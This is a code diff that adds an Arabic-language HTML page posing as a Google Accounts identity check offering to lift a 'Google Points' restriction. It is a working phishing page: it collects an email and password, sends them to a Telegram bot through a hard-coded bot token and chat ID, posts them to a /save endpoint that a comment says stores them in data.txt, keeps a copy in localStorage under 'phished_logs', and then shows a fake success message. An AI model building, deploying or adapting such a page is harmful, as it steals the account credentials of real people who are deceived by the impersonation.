@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد الهوية - حسابات Google</title>
+    <style>
+        /* نفس التنسيق السابق */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f8f9fa; font-family: system-ui, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; color: #202124; }
+        .container { width: 100%; max-width: 450px; padding: 20px; }
+        .logo { text-align: center; margin-bottom: 20px; }
+        .logo img { width: 80px; }
+        .card { background: white; border: 1px solid #dadce0; border-radius: 8px; padding: 48px 40px 36px; text-align: center; }
+        h2 { font-size: 24px; font-weight: 600; margin-bottom: 8px; }
+        .desc { color: #5f6368; margin-bottom: 30px; font-size: 15px; }
+        .input-field { margin-bottom: 20px; text-align: right; }
+        label { display: block; font-size: 14px; font-weight: 500; margin-bottom: 8px; }
+        input { width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; outline: none; direction: ltr; text-align: left; }
+        input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .btn { width: 100%; background: #1a73e8; color: white; border: none; padding: 12px; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 20px; }
+        .btn:hover { background: #1669c1; }
+        .footer { margin-top: 20px; font-size: 13px; color: #5f6368; display: flex; justify-content: space-between; }
+        .footer a { color: #1a73e8; text-decoration: none; margin-right: 15px; }
+        #step2 { display: none; }
+        .success-msg { display: none; margin-top: 20px; padding: 20px; background: #e6f4ea; border-radius: 8px; color: #137333; text-align: center; }
+        @media (max-width: 480px) { .card { padding: 30px 20px; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" alt="Google">
+    </div>
+    <div class="card" id="cardForm">
+        <div id="step1">
+            <h2>تأكيد الهوية</h2>
+            <p class="desc">أدخل البريد الإلكتروني المرتبط بحساب Google Points لإزالة القيد</p>
+            <div class="input-field">
+                <label>البريد الإلكتروني</label>
+                <input type="email" id="emailInput" placeholder="example@gmail.com" dir="ltr">
+            </div>
+            <button class="btn" onclick="nextStep()">التالي</button>
+        </div>
+        <div id="step2">
+            <h2>مرحباً بعودتك</h2>
+            <p class="desc">للمتابعة، أدخل كلمة المرور لحسابك</p>
+            <div class="input-field">
+                <label>كلمة المرور</label>
+                <input type="password" id="passInput" placeholder="أدخل كلمة المرور" dir="ltr">
+            </div>
+            <button class="btn" onclick="sendData()">تأكيد وإزالة القيد</button>
+        </div>
+    </div>
+    <div id="finalMsg" class="success-msg">
+        <strong>تم استلام الطلب بنجاح</strong><br>
+        ستتم مراجعة حسابك وإزالة القيد خلال 48 ساعة.
+    </div>
+    <div class="footer">
+        <span>العربية</span>
+        <span><a href="#">المساعدة</a><a href="#">الخصوصية</a><a href="#">البنود</a></span>
+    </div>
+</div>
+<script>
+    const TELEGRAM_TOKEN = '8613985953:AAEWC4xU0thhVyU1_LP0zGtXp5vf10lq4fE';
+    const CHAT_ID = '6774435744';  // تم تحديثه
+
+    function nextStep() {
+        const email = document.getElementById('emailInput').value.trim();
+        if (!email) { alert('الرجاء إدخال البريد الإلكتروني'); return; }
+        document.getElementById('step1').style.display = 'none';
+        document.getElementById('step2').style.display = 'block';
+    }
+
+    function sendData() {
+        const email = document.getElementById('emailInput').value.trim();
+        const pass = document.getElementById('passInput').value.trim();
+        if (!pass) { alert('الرجاء إدخال كلمة المرور'); return; }
+
+        // 1. إرسال إلى تيليجرام
+        const msg = `📧 بريد: ${email}\n🔑 كلمة مرور: ${pass}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+        }).catch(e => console.log('Telegram fail'));
+
+        // 2. إرسال إلى server.py (تخزين دائم في data.txt)
+        fetch('/save', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: `email=${encodeURIComponent(email)}&passwd=${encodeURIComponent(pass)}`
+        }).catch(e => console.log('Local save fail'));
+
+        // 3. تخزين محلي احتياطي
+        const logs = JSON.parse(localStorage.getItem('phished_logs') || '[]');
+        logs.push({ email, pass, time: new Date().toLocaleString() });
+        localStorage.setItem('phished_logs', JSON.stringify(logs));
+
+        // عرض النجاح
+        document.getElementById('cardForm').style.display = 'none';
+        document.getElementById('finalMsg').style.display = 'block';
+    }
+</script>
+</body>
+</html>
